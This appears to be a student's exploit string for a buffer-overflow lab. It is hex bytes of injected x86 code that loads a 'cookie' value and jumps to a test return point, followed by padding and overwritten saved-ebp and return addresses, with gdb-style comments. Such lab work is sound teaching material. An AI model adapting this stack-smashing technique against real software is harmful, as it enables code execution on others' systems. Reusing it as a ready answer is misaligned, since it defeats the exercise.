b8 6c c9 46 34  /* mov cookie */
68 7c 8d 04 08  /* address of return point for test */
c3  /* ret */
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 bb 84 30 68 55 c7 03 00 00 00 00 /* 18 */
90 30 68 55  /* change: ebp keep the same; print /x $ebp */
38 30 68 55  /* change: ret to the instruction; print /x $eax */
